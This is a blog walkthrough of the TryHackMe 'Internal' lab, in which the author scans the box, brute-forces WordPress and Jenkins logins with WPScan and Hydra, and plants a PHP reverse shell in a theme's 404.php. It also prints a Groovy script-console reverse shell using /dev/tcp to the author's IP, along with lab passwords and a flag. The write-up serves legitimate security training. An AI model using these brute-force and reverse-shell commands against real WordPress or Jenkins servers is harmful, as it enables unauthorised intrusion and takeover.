---
title: "Walk-through of Internal from TryHackMe"
header:
  teaser: /assets/images/2021-03-06-12-10-49.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - WordPress
  - WPScan
  - Jenkins
  - Hydra
---

## Machine Information

![internal](/assets/images/2021-03-06-12-10-49.png)

Internal is rated as a hard difficulty room on TryHackMe. No clues are given in the room description, we are just told to treat this as a black box exercise. After a port scan we see the server is Linux based with just two ports exposed. Further enumeration reveals a WordPress blog, which we gain admin access to via a brute force attack using WPScan. From there we exploit a theme to get a reverse shell on to the server. We find user credentials and gain access via SSH to discover Docker is running a hidden version of Jenkins. With SSH port forwarding we gain access to Jenkins, and brute force access to it using Hydra. Then we use the Jenkins console to run Javascript to get us another reverse shell, this time as our user. Finally we discover root credentials and can gain access via SSH to find the final flag.

<!--more-->
Skills required are basic port enumeration and exploration knowledge. Skills learned are WordPress and Jenkins exploits, as well as WPScan and Hydra brute forcing techniques.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Hard - Internal](https://tryhackme.com/room/internal) |
| Machine Release Date | 3rd August 2020 |
| Date I Completed It | 6th March 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

The pre-engagement briefing for the room tells us to ensure we add internal.thm to our local hosts file. That makes me think there's probably a web server, maybe we have multiple subdomains, or sites using host headers. Let's do as instructed:

```text
root@kali:/home/kali/thm/internal# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.249.199   internal.thm
```

Now let's start with Nmap to check for open ports:

```text
root@kali:/home/kali/thm/internal# ports=$(nmap -p- --min-rate=1000 -T4 internal.thm | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)                    
root@kali:/home/kali/thm/internal# nmap -p$ports -sC -sV -oA internal internal.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 21:58 GMT
Nmap scan report for internal.thm (10.10.249.199)
Host is up (0.034s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looks like we have a Linux server, possible Ubuntu,  with just two ports open. Apache 2.4.29 running on port 80 and OpenSSH 7.6p1 on port 22. 

Before moving on let's do a quick check of those versions:

```text
root@kali:/home/kali/thm/internal# searchsploit apache 2.4.29
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                              | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                            | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                        | linux/local/46676.php
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                          | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                         | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                   | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                   | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                          | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                            | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                          | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                    | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1) | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2) | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                 | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                             | linux/remote/34.pl
------------------------------------------------------------------------------------------------------------- ---------------------------------

root@kali:/home/kali/thm/internal# searchsploit openssh 7.6
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                               | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                                         | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Nothing on Exploit-DB. Let's move on to looking at port 80 first:

![internal-apache](/assets/images/2021-03-02-22-11-46.png)

## Gobuster

Just the standard install page for Apache, nothing hidden in the source, time for gobuster:

```text
root@kali:/home/kali/thm/internal# gobuster -t 50 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://internal.thm
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://internal.thm
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/02 22:13:29 Starting gobuster
===============================================================
http://internal.thm/wordpress (Status: 301)
http://internal.thm/javascript (Status: 301)
http://internal.thm/blog (Status: 301)
http://internal.thm/phpmyadmin (Status: 301)
http://internal.thm/server-status (Status: 403)
===============================================================
2021/03/02 22:15:52 Finished
===============================================================
```

## WPScan

We have a number of interesting subfolders. The one that jumps out is WordPress, because when doing CTFs that is often the starting point. Trying /wordpress redirects us to /blog:

![internal-blog](/assets/images/2021-03-02-22-25-04.png)

We have a vanilla WordPress site with a single test post by the user admin. Let's try wpscan to see what we can find:

```text
root@kali:/home/kali/thm/internal# wpscan --url http://internal.thm/blog -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://internal.thm/blog/ [10.10.249.199]
[+] Started: Tue Mar  2 22:20:59 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar  2 22:21:05 2021
[+] Requests Done: 70
[+] Cached Requests: 7
[+] Data Sent: 16.783 KB
[+] Data Received: 16.51 MB
[+] Memory used: 181.422 MB
[+] Elapsed time: 00:00:05
root@kali:/home/kali/thm/internal# 
```

We have confirmation the version of WordPress is 5.4.2, an out of date theme but not much else. We do have the user admin, let's try rockyou against it and see if we can brute force our way in:

```text
root@kali:/home/kali/thm/internal# wpscan --url internal.thm/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 100
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/wordpress/ [10.10.249.199]
[+] Started: Tue Mar  2 22:31:33 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <========================================================> (22 / 22) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys
Trying admin / marquez Time: 00:00:45 <                                                     > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: <HIDDEN>

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar  2 22:32:35 2021
[+] Requests Done: 3956
[+] Cached Requests: 5
[+] Data Sent: 1.884 MB
[+] Data Received: 2.585 MB
[+] Memory used: 254.047 MB
[+] Elapsed time: 00:01:01
```

## WordPress

We have the password for admin, what a great start. Let's try logging in:

![internal-wplogin](/assets/images/2021-03-02-22-41-35.png)

This works and we get to the admin dashboard:

![internal-wpdashboard](/assets/images/2021-03-02-22-39-08.png)

First I looked at the posts section and found a private one:

![internal-privatepost](/assets/images/2021-03-02-22-43-01.png)

If we edit the post we see some credentials:

![internal-creds](/assets/images/2021-03-02-22-43-48.png)

I'm not sure where to use these at the moment, so make a note for later.

The [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress) site has lots of good information on techniques for exploiting WordPress sites. [This](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce) section explains how to change a file in the default theme to a reverse shell, which we can use to connect back to us.

On Kali we already have several shells available, let's copy the pentestmonkey one to our current directory and change to the correct IP and port:

```text
root@kali:/home/kali/thm/internal# cp /usr/share/webshells/php/php-reverse-shell.php .

root@kali:/home/kali/thm/internal# ifconfig tun0
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.8.165.116  netmask 255.255.0.0  destination 10.8.165.116
        inet6 fe80::b00e:3b56:b96d:a314  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 521  bytes 248703 (242.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 691  bytes 86673 (84.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:/home/kali/thm/internal# nano php-reverse-shell.php 
```

Edit the file and chnage IP and port as needed:

```text
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.165.116';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Copy entire contents of file, go to Themes:

![internal-themes](/assets/images/2021-03-03-21-58-02.png)

Then Theme Editor:

![internal-editor](/assets/images/2021-03-03-22-14-56.png)

Then select the 404.php file:

![internal-404](/assets/images/2021-03-03-22-16-25.png)

Paste contents of the reverse shell file we edited over the top of the 404.php file:

![internal-edit404](/assets/images/2021-03-03-22-17-23.png)

Click the update button to save your changes:

![internal-update404](/assets/images/2021-03-03-22-19-09.png)

Start a netcat session waiting to catch the shell:

```text
root@kali:/home/kali/thm/internal# nc -nlvp 1337
listening on [any] 1337 ...
```

Back to the WordPress site and navigate to the 404.php page:

![internal-browse404](/assets/images/2021-03-03-22-21-18.png)

## Initial Shell

Now switch back to netcat to see we are connected:

```text
root@kali:/home/kali/thm/internal# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.249.199] 47286
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:23:19 up 55 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

First lets upgrade to a proper tty shell to make it easier to use:

```test
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@internal:/$ ^Z
[1]+  Stopped
root@kali:/home/kali/thm/internal# stty raw -echo
www-data@internal:/$
```

That's better, now we look around and find there is a user but we can't access their home folder:

```text
www-data@internal:/$ cd /home
www-data@internal:/home$ ls -lsa
total 12
4 drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
4 drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
4 drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
www-data@internal:/home$ cd aubreanna
bash: cd: aubreanna: Permission denied  
```

I tried a few of the usual CTF things like sudo privileges, suid binaries, unusual files and eventually I found this interesting one:

```text
www-data@internal:/$ cd /opt
www-data@internal:/opt$ ls -lsa
total 16
4 drwxr-xr-x  3 root root 4096 Aug  3  2020 .
4 drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
4 drwx--x--x  4 root root 4096 Aug  3  2020 containerd
4 -rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
```

Let's have a look at it:

```text
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:<HIDDEN>
www-data@internal:/opt$ 
```

## User Flag

Nice, they look like credentials, and we know ssh is open. Let's try and log in with them:

```text
kali@kali:~$ ssh aubreanna@internal.thm
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

  System load:  0.01              Processes:              115
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 33%               IP address for eth0:    10.10.3.221
  Swap usage:   0%                IP address for docker0: 172.17.0.1

Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
```

Interesting to see there is an IP address for Docker, something that may be relevant later. Let's grab the user flag:

```text
aubreanna@internal:~$ cd /home/aubreanna/
aubreanna@internal:~$ ls -ls
total 12              
4 -rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
4 drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
4 -rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ cat user.txt 
THM{int3rna1_fl4g_1}
```

I also see another file called jenkins.txt, let's look at that:

```text
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

More clues to what Docker is used for. We know from earlier that it's running on IP 172.17.0.1, now we see Jenkins may be running on that same network. So suggests it is running in Docker. Let's do some digging:

```text
aubreanna@internal:~$ arp
Address                  HWtype  HWaddress           Flags Mask            Iface
ip-172-17-0-2.eu-west-1  ether   02:42:ac:11:00:02   C                     docker0
ip-10-10-0-1.eu-west-1.  ether   02:c8:85:b5:5a:aa   C                     eth0

aubreanna@internal:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    100    0        0 eth0
10.10.0.0       0.0.0.0         255.255.0.0     U     0      0        0 eth0
ip-10-10-0-1.eu 0.0.0.0         255.255.255.255 UH    100    0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0

aubreanna@internal:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:43871         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 10.10.3.221:22          10.8.165.116:42292      ESTABLISHED keepalive (6612.34/0/0)
tcp        0      0 10.10.3.221:55882       10.8.165.116:1337       ESTABLISHED off (0.00/0/0)

aubreanna@internal:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:5cff:fe42:771a  prefixlen 64  scopeid 0x20<link>
        ether 02:42:5c:42:77:1a  txqueuelen 0  (Ethernet)
        RX packets 28355  bytes 1134536 (1.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28371  bytes 2099313 (2.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.178.17  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::76:32ff:feca:574d  prefixlen 64  scopeid 0x20<link>
        ether 02:76:32:ca:57:4d  txqueuelen 1000  (Ethernet)
        RX packets 8511  bytes 3537188 (3.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16355  bytes 4702658 (4.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

aubreanna@internal:~$ netcat -v -z -n -w 1 172.17.0.2 8080
Connection to 172.17.0.2 8080 port [tcp/*] succeeded!
```

## SSH Tunneling

We definitely have something running on that IP and listening on port 8080. We can't see that port externally with nmap, so can assume it's hidden behind a firewall. I covered how to use SSH tunneling (also known as port forwarding) to access ports behind firewalls in my [GameZone writeup](https://pencer.io/ctf/ctf-thm-game-zone/). It's pretty simple, we just use the -L parameter and specify a local port to forward to the IP and port on the server:

```text
root@kali:/home/kali/thm/internal# ssh -L 1234:172.17.0.2:8080 aubreanna@internal.thm
aubreanna@internal.thm's password:                                                                                                                                                                                                         
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
Last login: Thu Mar  4 21:09:31 2021 from 10.8.165.116
aubreanna@internal:~$ 
```

So above we've said any traffic on Kali port 1234 forward to the IP 172.17.0.2 on port 8080 using the SSH connection we have to the internal.thm server. Now we can open a browser locally on Kali and go to local port 1234, our traffic is passed through the SSH tunnel and we open the page on the internal.thm server:

![internal-jenkins](/assets/images/2021-03-04-21-39-29.png)

## Jenkins

We have the login page for Jenkins. I tried the credentials we've found so far without success. I also tried defaults like admin:admin etc, but nothing worked. So we have to assume we'll need to brute force our way in. First capture a login attempt in Burp:

![internal-burp](/assets/images/2021-03-04-22-07-01.png)

Forward the response from Burp, then look back a the login page to see what the failed login message is:

![internal-failedlogon](/assets/images/2021-03-04-22-12-01.png)

We now have all the information needed to use Hydra with a wordlist and attempt to find a password:

```text
root@kali:/home/kali/thm/internal# hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -s 1234 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-04 22:14:30
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://localhost:1234/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[STATUS] 432.00 tries/min, 432 tries in 00:01h, 14343967 to do in 553:24h, 16 active
[1234][http-post-form] host: localhost   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-04 22:16:05
```

This is a CTF so as expected the default account of admin and the rockyou wordlist worked for us!

Now we can log in to Jenkins:

![internal-jenkinsdashboard](/assets/images/2021-03-04-22-19-54.png)

Not being familiar with Jenkins I simply Googled "Jenkins reverse shell" and found a few ways to get a one. [This](https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/) article explains it pretty well and gives you the code needed. I copied the script to Jenkins and changed it to my Kali IP and port:

```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.165.116/8888;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Now start a netcat session listening:

```text
root@kali:/home/kali/thm/internal# nc -nvlp 8888
listening on [any] 8888 ...
```

Now over to Jenkins to add the script via Manage Jenkins and then Script Console:

![internal-script](/assets/images/2021-03-04-22-29-04.png)

Now we just paste our script and run it:

![internal-run](/assets/images/2021-03-04-22-41-37.png)

And we get our reverse shell:

```text
kali@kali:~$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.178.17] 50164
/bin/bash -i
jenkins@jenkins:/$ id  
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

We are inside docker, so not all commands work. I just had a look around and found an interesting file in the /opt as before:

```text
jenkins@jenkins:/$ ls -lsa /opt
ls -lsa /opt
total 12
4 drwxr-xr-x 1 root root 4096 Aug  3  2020 .
4 drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
4 -rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
```

Let's have a look:

```text
jenkins@jenkins:/$ cat /opt/note.txt
cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:<HIDDEN>
```

## Root Flag

At last we've found a user name and password for root. Let's try it:

```text
kali@kali:~$ ssh root@internal.thm
Warning: Permanently added the ECDSA host key for IP address '10.10.178.17' to the list of known hosts.
root@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
  System information as of Thu Mar  4 22:50:37 UTC 2021
  System load:  0.0               Processes:              106
  Usage of /:   63.8% of 8.79GB   Users logged in:        0
  Memory usage: 37%               IP address for eth0:    10.10.178.17
  Swap usage:   0%                IP address for docker0: 172.17.0.1
Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
```

We're in, let's grab the root flag:

```text
root@internal:~# ls -lsa
total 48
4 drwx------  7 root root 4096 Aug  3  2020 .
4 drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
4 -rw-------  1 root root  193 Aug  3  2020 .bash_history
4 -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
4 drwx------  2 root root 4096 Aug  3  2020 .cache
4 drwx------  3 root root 4096 Aug  3  2020 .gnupg
4 drwxr-xr-x  3 root root 4096 Aug  3  2020 .local
4 -rw-------  1 root root 1071 Aug  3  2020 .mysql_history
4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4 drwx------  2 root root 4096 Aug  3  2020 .ssh
4 -rw-r--r--  1 root root   22 Aug  3  2020 root.txt
4 drwxr-xr-x  3 root root 4096 Aug  3  2020 snap

root@internal:~# cat root.txt 
<HIDDEN>
root@internal:~# 
```

All done. See you next time.
